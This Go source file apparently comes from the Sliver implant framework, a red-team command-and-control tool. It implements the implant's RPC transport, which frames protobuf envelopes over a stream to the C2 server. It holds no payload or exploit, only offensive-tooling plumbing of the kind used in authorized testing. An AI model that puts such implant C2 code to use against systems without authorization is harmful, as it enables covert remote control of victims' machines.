package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"encoding/binary"
	"errors"
	"io"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/golang/protobuf/proto"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

// setupSessionRPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
// The stream parameter is not "tracked" or "registered" by ourselves, but we should need to.
func setupSessionRPC(stream io.ReadWriteCloser) (c2 *Connection, err error) {

	if stream == nil {
		return nil, errors.New("Attempted to setup RPC layer around nil net.Conn")
	}

	c2 = &Connection{
		Send:    make(chan *pb.Envelope),
		Recv:    make(chan *pb.Envelope),
		ctrl:    make(chan bool),
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[RPC] lost connection/stream, cleaning up RPC...")
			// {{end}}
			close(c2.Send)
			close(c2.Recv)
			// In sliver we close the physical conn.
			// Here we close the logical stream only.
			stream.Close()
		},
	}

	go func() {
		defer c2.Cleanup()
		for envelope := range c2.Send {
			connWriteEnvelope(stream, envelope)
		}
	}()

	go func() {
		defer c2.Cleanup()
		for {
			envelope, err := connReadEnvelope(stream)
			if err == io.EOF {
				break
			}
			if err == nil {
				c2.Recv <- envelope
			}
		}
	}()

	// {{if .Config.Debug}}
	log.Printf("Done creating RPC C2 stream.")
	// {{end}}

	return
}

// connWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the reciever can delimit messages properly
func connWriteEnvelope(connection io.ReadWriteCloser, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

// connReadEnvelope - Reads a message from the TLS connection using length prefix framing
func connReadEnvelope(connection io.ReadWriteCloser) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(dataLengthBuf) == 0 || connection == nil {
		panic("[[GenerateCanary]]")
	}
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return &pb.Envelope{}, err
	}

	return envelope, nil
}
